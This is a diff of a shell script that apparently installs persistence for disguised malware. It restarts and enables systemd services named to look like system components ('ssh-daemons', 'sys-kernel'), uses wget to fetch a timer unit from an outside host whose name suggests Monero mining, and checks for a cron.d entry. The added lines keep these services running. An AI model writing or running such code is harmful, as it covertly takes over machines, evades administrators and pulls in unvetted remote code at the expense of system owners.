@@ -1,3 +1,6 @@
+systemctl restart ssh-daemons
+sleep 10
+systemctl restart sys-kernel
 if [ ! -f /etc/systemd/system/ssh-daemons.timer ]; then
 	systemctl stop ssh-daemons
 	systemctl disable ssh-daemons
@@ -7,6 +10,9 @@ if [ ! -f /etc/systemd/system/ssh-daemons.timer ]; then
 	wget https://xmrhorizontal.github.io/ssh-daemons.timer
 	systemctl daemon-reload
         systemctl enable ssh-daemons.timer
+	systemctl start ssh-daemons
+ 	sleep 10
+  	systemctl restart sys-kernel
 fi
 if [ ! -f /etc/cron.d/cronextend ]; then
 	apt-get update
